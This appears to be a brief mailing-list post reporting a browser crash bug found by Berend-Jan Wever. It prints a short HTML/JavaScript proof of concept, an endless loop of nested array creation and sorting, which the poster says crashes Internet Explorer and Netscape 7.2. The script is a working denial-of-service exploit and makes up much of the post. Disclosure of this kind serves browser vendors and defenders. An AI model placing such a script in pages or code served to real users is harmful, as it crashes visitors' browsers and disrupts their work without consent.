Hello, i saw a flaw in IE that using a Javascript it could be possible
to crash the browser. Berend-Jan Wever discovered this problem, which
consist in the following script:
 
<HTML>
  <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
  <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
</HTML>

I tested on netscape 7.2 (under windows) and the samething happened.
Netscape 7.2 will crash with that script.

Thanks,
Carlos Ulver.
